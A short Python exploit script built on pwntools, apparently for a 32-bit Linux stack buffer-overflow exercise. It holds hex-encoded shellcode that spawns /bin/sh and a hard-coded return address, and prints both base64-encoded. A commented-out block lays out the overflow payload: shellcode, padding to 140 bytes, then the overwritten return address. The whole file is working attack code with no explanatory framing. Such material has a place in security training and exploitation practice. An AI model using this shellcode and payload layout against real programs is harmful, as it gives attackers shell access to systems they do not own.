import base64
import pwn

# From: `pwn shellcraft i386.linux.sh`
shellcode = bytes.fromhex('6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80')
return_addr = pwn.p32(0xbfffff42 - 4)

print(return_addr)

#payload = shellcode \
#        + return_addr \
#        + ((140 - len(return_addr))  - len(shellcode)) * b'w' \
#        + return_addr

print(base64.b64encode(return_addr))
print(base64.b64encode(shellcode))
